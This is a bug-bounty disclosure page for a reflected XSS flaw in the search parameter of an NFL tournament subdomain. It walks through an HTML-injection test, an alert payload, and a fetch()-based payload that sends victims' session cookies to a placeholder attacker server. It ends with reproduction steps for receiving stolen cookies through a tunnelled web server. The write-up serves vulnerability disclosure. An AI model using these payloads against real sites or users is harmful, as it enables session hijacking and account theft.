---
layout: default
---

<div class="container">
<article>
  <a href="../../../en/" class="back-btn">
    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
    {{ site.title }}
  </a>
  <div class="lang-switcher">
    <a href="../../../es/bounties/nfl-xss-search-query/" class="lang-btn">Español (ES)</a>
    <a href="./" class="lang-btn active">English (EN)</a>
  </div>

  <div class="bounty-header">
    <h1>NFL: Reflected XSS in URL Search Query Parameter</h1>
    <p>Reflected Cross-Site Scripting vulnerability on <code>hbcutournament.nfl.com</code> — from HTML injection to session cookie exfiltration.</p>
  </div>

  <div class="bounty-content">

    <h2>🎯 Affected URLs</h2>
<pre><code>https://hbcutournament.nfl.com/resources?q=
https://hbcutournament.nfl.com/blogs?q=</code></pre>
    <p>The application does not properly sanitize or encode input passed via the <code>?q=</code> URL parameter, allowing for injection and execution of arbitrary JavaScript in the browser context.</p>

    <h2>💉 HTML Injection</h2>
    <p>The first thing we tried in the search field was a simple HTML injection. The payload we used:</p>
<pre><code>&lt;h1&gt;This is a HTML Injection test&lt;/h1&gt; --- This is a normal text.</code></pre>
    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20HTML%20Injection.png" alt="HTML Injection">

    <h2>🚨 Reflected XSS</h2>
    <p>After testing several payloads, we discovered that the <code>&lt;img&gt;</code> tag works. The payload we used:</p>
<pre><code>&lt;img/src/onerror=alert(8)&gt;</code></pre>
    <p>The malicious URL:</p>
    <p><code>https://hbcutournament.nfl.com/resources?q=&lt;img/src/onerror=alert(8)&gt;</code></p>
    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Alert%201.png" alt="XSS Alert">

    <h2>🚀 Cookies Exfiltration</h2>
    <p>After verifying JavaScript execution, we attempted to exfiltrate cookies. This attack steals session cookies of any user who clicks the malicious link.</p>
<pre><code>&lt;img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))&gt;</code></pre>
    <p>The malicious URL:</p>
    <p><code>https://hbcutournament.nfl.com/resources?q=&lt;img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))&gt;</code></p>
    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Cookies%20Exfiltration.png" alt="Cookie Exfiltration">
    <p>The exfiltrated cookies were successfully received on the attacker's server:</p>
    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Cookies%20Exfiltration%20Result.png" alt="Exfiltration Result">

    <h2>🎯 Steps to Reproduce</h2>
    <ol>
      <li>Start a Web Server:
<pre><code>python3 -m http.server 8000</code></pre>
      </li>
      <li>Start a public web server with Serveo in another terminal tab:
<pre><code>ssh -R 80:localhost:8001 serveo.net</code></pre>
      </li>
      <li>Create an account on <a href="https://hbcutournament.nfl.com/register" target="_blank">hbcutournament.nfl.com/register</a></li>
      <li>Prepare the malicious URL:<br>
        <code>https://hbcutournament.nfl.com/resources?q=&lt;img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))&gt;</code>
      </li>
      <li>Share the malicious URL with another registered user.</li>
      <li>Receive the victim's cookies in your Python HTTP server.</li>
    </ol>
    <p><strong>Note:</strong> When the payload is an <code>&lt;img&gt;</code> element, execution may be delayed because requests have a default timeout. Use an alternative XSS vector, such as the <code>onload</code> attribute, to achieve immediate execution.</p>

    <h2>⚠️ Security Impact</h2>
    <ul>
      <li><strong>Session Hijacking:</strong> Steal session cookies.</li>
      <li><strong>Phishing Redirection:</strong> Redirect to attacker-controlled domains.</li>
      <li><strong>DOM Access:</strong> Extract sensitive data.</li>
      <li><strong>Credential Theft:</strong> Serve spoofed login prompts via script injection.</li>
    </ul>

    <h2>🤝 Collaboration Detail</h2>
    <p>This research was conducted in a <strong>50/50 collaboration</strong> between <strong>{{ site.researchers.ivan.name }}</strong> and <strong>{{ site.researchers.diego.name }}</strong>. Both researchers contributed equally to the discovery, exploitation, and documentation of this vulnerability.</p>
  </div>
</article>
</div>

<div class="zoom-overlay" id="zoomOverlay" onclick="this.classList.remove('active')">
  <img id="zoomImg" src="" alt="Zoom">
</div>
<script>
document.querySelectorAll('.bounty-content img').forEach(img => {
  img.addEventListener('click', () => {
    document.getElementById('zoomImg').src = img.src;
    document.getElementById('zoomOverlay').classList.add('active');
  });
});
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
});
</script>
